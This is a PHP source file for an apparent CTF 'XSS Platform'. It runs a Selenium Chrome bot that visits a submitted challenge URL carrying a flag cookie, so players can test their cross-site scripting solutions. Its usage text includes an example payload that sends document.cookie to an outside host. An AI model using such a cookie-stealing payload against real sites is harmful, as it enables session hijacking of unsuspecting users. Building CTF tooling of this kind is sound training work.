<?php
namespace Facebook\WebDriver;

use Facebook\WebDriver\Remote\DesiredCapabilities;
use Facebook\WebDriver\Remote\RemoteWebDriver;
require_once('../vendor/autoload.php');
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

if( ($_REQUEST['XSS'] != "") && ($_REQUEST['url'] != "") && ($_REQUEST['flag'] != "") && ($_REQUEST['url'] != $_SERVER['SERVER_NAME']) ){
  $host = 'http://selenium:4444/wd/hub'; // this is the default
  $capabilities = DesiredCapabilities::chrome();
  $driver = RemoteWebDriver::create($host, $capabilities, 10000, 5000);
  
  $parsed_url = parse_url($_REQUEST['url']);
  if(	$parsed_url && ($parsed_url['scheme'] === 'http' || $parsed_url['scheme'] === 'https') && $parsed_url['host'] === '' )
      die("NoDa");
  $flag = $_REQUEST['flag'];
  $url = $parsed_url['scheme'].'://'.$parsed_url['host'].$parsed_url['path'];
  try{
      $driver->get($url);
      $cookie = new Cookie('FLAG', $flag);
      $driver->manage()->addCookie($cookie);
      $driver->get($url."?".$parsed_url['query']);
      $cookies = $driver->manage()->getCookies();
  // print_r($cookies);
  } catch (\Exception $var) {
      if($driver){
          $driver->quit();
      }
      die("NoDa");
  } finally {
      if($driver){
          $driver->quit();
          die("YesDa");
      }
  }
} else if ( ($_REQUEST['XSS'] != "") || ($_REQUEST['url'] != "") || ($_REQUEST['flag'] != "") ) {
  die("NoDa");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>XSS Platform Comming-Soon</title>

    <!-- Bootstrap core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,200i,300,300i,400,400i,600,600i,700,700i,900,900i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Merriweather:300,300i,400,400i,700,700i,900,900i" rel="stylesheet">
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="css/coming-soon.min.css" rel="stylesheet">


  </head>

  <body>
    <div class="overlay"></div>

    <div class="masthead">
      <div class="masthead-bg"></div>
      <div class="container h-100">
        <div class="row h-100">
          <div class="col-12 my-auto">
            <div class="masthead-content text-white py-5 py-md-0">
			  <h1 class="mb-3">XSS Platform!</h1>
			  <p class="mb-5">The XSS Platform for CTF examiner.</p>
                <div id="g0x55" class="input-group input-group-newsletter">
					<input name="url" type="text" class="form-control" placeholder="XSS URL Here!" style="border-top-right-radius: 3px; border-bottom-right-radius: 3px;">
					<div class="input-group input-group-newsletter">
						<input name="flag" type="text" class="form-control" placeholder="Flag's Here!" style="">
					</div>				
					<input name="XSS" type="hidden" value="g0x55">
					<button id="GoDa" type="submmit" class="btn btn-secondary" value="Go! XSS!" style="width: 100%;">Go! XSS!</button>
				</div>
				<p></p>
				<h4 class="mb-3">How To use It?</h4>
				<p class="mb-1">Insert your challenge URL containing the XSS and Insert FLAG then press the 'Go XSS' button!<hr>
				Ex) URL: http://xss.r-e.kr/?xss=location.href%3D"https://your.com?"%2bdocument.cookie
				FLAG : FLAG{This_is_MY_Frist_XSS_challenge!}
				</p>
			  <p class="mb-5">I'm working hard to finish the development of 'XSS Platform'. I target launch date is
				  <strong>April 2018</strong>! Test my frist xss platform! <br>
				  If you find any errors, please <button id="copy-mail" type="button" class="btn btn-secondary" >contact me!</button>
			  </p>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="social-icons">
      <ul class="list-unstyled text-center mb-0">
        <li class="list-unstyled-item">
          <a href="https://twitter.com/nex369">
            <i class="fa fa-twitter"></i>
          </a>
        </li>
        <li class="list-unstyled-item">
          <a href="https://www.facebook.com/silnex.kr">
            <i class="fa fa-facebook"></i>
          </a>
        </li>
      </ul>
    </div>

    <!-- Bootstrap core JavaScript -->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Plugin JavaScript -->
    <script src="vendor/vide/jquery.vide.min.js"></script>

    <!-- Custom scripts for this template -->
    <script src="js/coming-soon.min.js"></script>
    <script>
		$('#GoDa').click(function () {
			$.ajax({
				url: location.href,
				type: 'post',
				data: $('#g0x55 input').serialize(),
				success: function(data){
					alert(data);
				}
			})
		});

		$("#copy-mail").click(function () {
			var copyText = document.getElementById("Email");
			copyText.select();
  			document.execCommand("Copy");
			prompt("Please copy my e-mail", "silnex@silnex.kr");
		})
	</script>
	<input id="Email" style="display: none;" value="silnex@silnex.kr">
  </body>
</html>